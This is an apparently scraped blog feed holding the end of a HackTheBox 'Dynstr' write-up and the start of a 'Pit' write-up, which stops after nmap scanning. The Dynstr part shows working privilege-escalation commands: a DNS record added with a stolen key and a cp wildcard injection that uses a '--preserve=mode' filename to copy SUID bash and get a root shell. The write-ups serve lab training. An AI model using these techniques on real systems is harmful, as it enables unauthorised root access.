</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dynamicdns.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dynamicdns.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;no-ip.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;no-ip.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// *** WORK IN PROGRESS, see bindmgr.sh ***
</span></span><span class="line"><span class="cl">// include <span class="s2">&#34;/etc/bind/named.conf.bindmgr&#34;</span><span class="p">;</span></span></span></code></pre>
</figure><p>The idea here is to add a sub domain to <code>dyna.htb</code> zone, and it must be part of <code>infra.dyna.htb</code>, such as <code>iamf.infra.dyna.htb</code>. I will also point that domain to my IP so I can SSH from my machine. These all can be done with the following commands.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/etc/bind$ nsupdate -k ./infra.key
</span></span><span class="line"><span class="cl">&gt; update add iamf.infra.dyna.htb <span class="m">3600</span> A 10.10.14.53
</span></span><span class="line"><span class="cl">&gt; update add 53.14.10.10.in-addr.arpa. <span class="m">600</span> PTR iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl">&gt; show
</span></span><span class="line"><span class="cl">Outgoing update query:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: UPDATE, status: NOERROR, id:      <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags:<span class="p">;</span> ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> UPDATE SECTION:
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">0</span>       ANY     A
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">53.14.10.10.in-addr.arpa. <span class="m">600</span>   IN      PTR     iamf.infra.dyna.htb.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; send</span></span></code></pre>
</figure><p>I can confirm with dig that my domain has been added.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.infra.dyna.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">56211</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: 7d13ea1a1d5d21b90100000060cb40c0b256362f3bd3da35 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf.infra.dyna.htb.           IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">59</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Thu Jun <span class="m">17</span> 08:31:59 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">92</span></span></span></code></pre>
</figure><h4 id="ssh-bindmgr">SSH bindmgr</h4>
<p>Now I can SSH login as bindmgr</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class="line"><span class="cl">Last login: Tue Jun  <span class="m">8</span> 19:19:17 <span class="m">2021</span> from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
</span></span><span class="line"><span class="cl">bindmgr@dynstr:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span></span></span></code></pre>
</figure><p>The flag:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 support-case-C62796521
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> bindmgr bindmgr   <span class="m">33</span> Jun <span class="m">17</span> 10:51 user.txt
</span></span><span class="line"><span class="cl">bindmgr@dynstr:~$ cat user.txt
</span></span><span class="line"><span class="cl">6404e...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Checking for sudo permissions reveals that <code>bindmgr</code> is allowed to run a script called <code>bindmgr.sh</code> as root.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ sudo -l
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> bindmgr on dynstr:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User bindmgr may run the following commands on dynstr:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh</span></span></code></pre>
</figure><p>The author gives a well documented about what this script does.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/usr/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># This script generates named.conf.bindmgr to workaround the problem</span>
</span></span><span class="line"><span class="cl"><span class="c1"># that bind/named can only include single files but no directories.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
</span></span><span class="line"><span class="cl"><span class="c1"># from named.conf.local (or others) and will include all files from the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># directory /etc/bin/named.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># NOTE: The script is work in progress. For now bind is not including</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       named.conf.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Currently the script is only adding files to the directory but</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       not deleting them. As we generate the list of files to be included</span>
</span></span><span class="line"><span class="cl"><span class="c1">#       from the source directory they won&#39;t be included anyway.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">BINDMGR_CONF</span><span class="o">=</span>/etc/bind/named.conf.bindmgr
</span></span><span class="line"><span class="cl"><span class="nv">BINDMGR_DIR</span><span class="o">=</span>/etc/bind/named.bindmgr
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">indent<span class="o">()</span> <span class="o">{</span> sed <span class="s1">&#39;s/^/    /&#39;</span><span class="p">;</span> <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check versioning (.version)</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Running </span><span class="nv">$0</span><span class="s2"> to stage new configuration from </span><span class="nv">$PWD</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> ! -f .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">42</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span class="s2">&#34;`cat </span><span class="nv">$BINDMGR_DIR</span><span class="s2">/.version 2&gt;/dev/null`&#34;</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">43</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create config file that includes all files from named.bindmgr.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Creating </span><span class="nv">$BINDMGR_CONF</span><span class="s2"> file.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">printf</span> <span class="s1">&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; <span class="nv">$BINDMGR_CONF</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> file in * <span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="nb">printf</span> <span class="s1">&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> &gt;&gt; <span class="nv">$BINDMGR_CONF</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Stage new version of configuration files.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">cp .version * /etc/bind/named.bindmgr/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Check generated configuration with named-checkconf.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Checking staged configuration.&#34;</span>
</span></span><span class="line"><span class="cl">named-checkconf <span class="nv">$BINDMGR_CONF</span> &gt;/dev/null
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
</span></span><span class="line"><span class="cl">    named-checkconf <span class="nv">$BINDMGR_CONF</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> indent
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">44</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;[+] Configuration successfully staged.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># *** TODO *** Uncomment restart once we are live.</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># systemctl restart bind9</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
</span></span><span class="line"><span class="cl">        systemctl status bind9
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span></span></span></code></pre>
</figure><p>The first two <code>if</code> statement show that the script wants a file called <code>.version</code>, and since it looks from <code>$PWD</code>, I can create that file in anywhere.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version</span></span></code></pre>
</figure><p>Then when I run the script, it throws the following error.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:~$ sudo bindmgr.sh
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class="line"><span class="cl">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class="line"><span class="cl">    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found</span></span></code></pre>
</figure><p>And this one is interesting</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span></span></span></code></pre>
</figure><p>If I trace it, the error come from these lines.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stage new version of configuration files.</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
</span></span><span class="line"><span class="cl">cp .version * /etc/bind/named.bindmgr/</span></span></code></pre>
</figure><p>According to <a href="https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/"target="_blank" rel="noopener noreferrer"
>Hackingarticles</a>, using <code>cp</code> with <code>*</code> can lead to wildcard injection.</p>
<h4 id="exploitation">Exploitation</h4>
<p>To exploit <code>cp</code> with <code>*</code> (wildcard), I will create a copy of the bash binary and set SUID permissions on it, and then I will create another file with a filename  <code>--preserve=mode</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ touch  <span class="s1">&#39;--preserve=mode&#39;</span>
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ cp /bin/bash .
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ chmod u+s bash
</span></span><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">1164</span>
</span></span><span class="line"><span class="cl">drwxrwxrwt  <span class="m">2</span> root    root        <span class="m">100</span> Jun <span class="m">17</span> 15:18  .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">17</span> root    root       <span class="m">3940</span> Jun <span class="m">17</span> 10:51  ..
</span></span><span class="line"><span class="cl">-rwsr-sr-x  <span class="m">1</span> bindmgr bindmgr <span class="m">1183448</span> Jun <span class="m">17</span> 15:18  bash
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">1</span> Jun <span class="m">17</span> 15:12 <span class="s1">&#39;--preserve=mode&#39;</span>
</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">2</span> Jun <span class="m">17</span> 14:47  .version</span></span></code></pre>
</figure><p><code>cp</code> will see that <code>--preserve=mode</code> file as name as a flag/option/switch, so it becomes</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cp .version --preserve<span class="o">=</span>mode /etc/bind/named.bindmgr/</span></span></code></pre>
</figure><p>When I run <code>bindmgr.sh</code> again, it throws another error.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh
</span></span><span class="line"><span class="cl">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">&#39;ELF☻☺☺...&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">&#39;♥h□ȀE□♣&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">&#39;□YF&#39;</span>
</span></span><span class="line"><span class="cl">    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">&#39;}&#39;</span></span></span></code></pre>
</figure><p>But now under <code>/etc/bind/named.bindmgr</code>, I have a copy of bash with SUID permissions set to root.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ ls -la /etc/bind/named.bindmgr
</span></span><span class="line"><span class="cl">total <span class="m">1168</span>
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">2</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 .
</span></span><span class="line"><span class="cl">drwxr-sr-x <span class="m">3</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 ..
</span></span><span class="line"><span class="cl">-rwsr-sr-x <span class="m">1</span> root <span class="nb">bind</span> <span class="m">1183448</span> Jun <span class="m">17</span> 15:18 bash
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root <span class="nb">bind</span>       <span class="m">2</span> Jun <span class="m">17</span> 15:18 .version</span></span></code></pre>
</figure><p>Executing that bash with <code>-p</code> gives me a root shell.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
</span></span><span class="line"><span class="cl">bash-5.0# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span>,1001<span class="o">(</span>bindmgr<span class="o">)</span>
</span></span><span class="line"><span class="cl">bash-5.0# whoami
</span></span><span class="line"><span class="cl">root</span></span></code></pre>
</figure><p>The flag</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-5.0# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">14</span> 14:18 cleanup
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun <span class="m">17</span> 10:51 root.txt
</span></span><span class="line"><span class="cl">bash-5.0# cat root.txt
</span></span><span class="line"><span class="cl">64348...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Pit</title>
      <link>https://fahmifj.github.io/ctf/hackthebox/pit/</link>
      <pubDate>Wed, 13 Oct 2021 16:54:04 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hackthebox/pit/</guid>
      <description>As a medium difficulty box, Pit from Hack The Box has an interesting enumeration flow. It starts by enumerating SNMP to reveal a username and a hidden web path to a CMS called SeedDMS. The CMS is vulnerable to a remote code execution, allowing me to obtain a database password that I can then use on a Cockpit instance. Enumerating the system from Cockpit&amp;rsquo;s terminal reveals that each time an SNMP &amp;ldquo;walk&amp;rdquo; is performed, there will be an execution on a script.</description>
      <content:encoded><![CDATA[<p>As a medium difficulty box, Pit from Hack The Box has an interesting enumeration flow. It starts by enumerating SNMP to reveal a username and a hidden web path to a CMS called SeedDMS. The CMS is vulnerable to a remote code execution, allowing me to obtain a database password that I can then use on a <a href="https://cockpit-project.org/"target="_blank" rel="noopener noreferrer"
>Cockpit</a> instance. Enumerating the system from Cockpit&rsquo;s terminal reveals that each time an SNMP &ldquo;walk&rdquo; is performed, there will be an execution on a script. This script basically searches for and executes other scripts in a specific directory to which I have write access, allowing me to create a malicious script in there to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SNMP enumeration and exploitation</li>
<li>SeedDMS exploitation</li>
<li>Cockpit exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>snmpwalk</li>
<li>gobuster</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<h4 id="tcp">TCP</h4>
<p>For TCP ports, <code>nmap</code> discovers 3 open ports: SSH on port 22, an NGINX web server on port 80, and a service that <code>nmap</code> identifies it as zeus-admin.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-pit 10.10.10.241
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:03 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.241
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.079s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> filtered ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65332</span> no-responses and <span class="m">200</span> admin-prohibiteds
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE         REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh             syn-ack ttl <span class="m">63</span> OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http            syn-ack ttl <span class="m">63</span> nginx 1.14.1
</span></span><span class="line"><span class="cl">9090/tcp open  ssl/zeus-admin? syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 401.69 seconds
</span></span><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nmap -p22,80,9090 --max-rate <span class="m">1000</span> -sC -oA nmap/10-tcp-defaultsc-pit 10.10.10.241
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-20 11:12 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.241
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.16s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Test Page <span class="k">for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
</span></span><span class="line"><span class="cl">9090/tcp open  zeus-admin
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dms-pit.htb/organizationName<span class="o">=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class="o">=</span>US
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-04-16T23:29:12
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2030-06-04T16:09:12
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 4.39 seconds</span></span></code></pre>
</figure><p>Also, <code>nmap</code> revealed a domain name <code>dms-pit.htb</code> from the SSL certificate on port 9090. I will add it to my <code>/etc/hosts</code> file</p>
<figure class="highlight">
